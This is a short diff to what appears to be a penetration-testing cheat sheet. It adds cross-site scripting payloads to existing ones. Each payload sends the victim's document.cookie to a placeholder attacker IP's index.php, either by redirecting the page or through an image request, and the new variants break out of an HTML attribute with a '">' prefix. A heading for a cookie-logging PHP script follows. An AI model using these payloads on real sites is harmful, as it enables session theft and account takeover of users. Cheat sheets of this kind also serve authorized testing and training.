@@ -498,7 +498,9 @@ https://www.boxentriq.com/code-breaking/cipher-identifier
 
 ```
 <script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
-<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
+<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>
+"><script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
+"><script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
 ```
 
 - Cookie Logging Script (log.php)
